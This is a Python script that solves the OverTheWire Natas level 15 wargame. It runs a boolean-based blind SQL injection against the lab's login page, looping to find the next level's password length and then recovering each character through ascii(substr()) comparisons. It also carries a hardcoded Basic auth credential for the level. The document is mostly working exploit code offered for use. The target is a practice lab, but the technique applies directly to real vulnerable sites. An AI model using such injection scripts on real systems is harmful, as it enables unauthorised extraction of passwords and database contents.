import requests

headers = {'Authorization': 'Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg=='}

url = 'http://natas15.natas.labs.overthewire.org/index.php'

password = ''

#next, we need to find out how long the password is

#this payload should request the length of the password for natas16, and compare it to our value 'l'
#our value will be appended to the paylaod and use a loop to cycle through until a true value is reached

length = 0

for l in range(1,65):
    payload = '?username=natas16"+and+length(password)={}--+'.format(l)
    
    r = requests.post(url+payload, headers=headers)
    if 'exists' in r.text:
        length = l
        break

print('the password is {} characters long'.format(length))

#now that we have the lenght, we need to figure out the characters for each letter of the password

for c in range(1,length+1): #loop for each character in the password
    for i in range(33,127): #loop for each ascii character (33-126 are non-whitespace pw allowable chrs)
        payload = '?username=natas16"+and+ascii(substr(password,{},1))={}--+'.format(c, i)
        
        r = requests.post(url+payload, headers=headers)
        if 'exists' in r.text:
            password += chr(i)
            break

print(password)
